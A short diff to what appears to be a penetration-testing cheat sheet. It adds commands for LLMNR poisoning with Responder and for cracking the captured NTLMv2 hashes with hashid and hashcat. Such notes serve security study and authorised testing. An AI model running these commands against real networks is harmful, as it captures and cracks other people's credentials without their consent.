@@ -9,3 +9,15 @@ Impacket : https://github.com/SecureAuthCorp/impacket
 LMNR Poisoning
 --------------------------------------------------------
 > sudo responder -I eth0 -rdwv
+OR TRY
+> sudo responder -I eth0 -dwv
+
+Cracking Captured HASH
+--------------------------------------------------------
+1. Identify the Hash
+> hashid hash.txt 
+
+2. sudo hashcat -m 5600 hash.txt                     // 5600 - NTLMv2 hash 
+
+
+
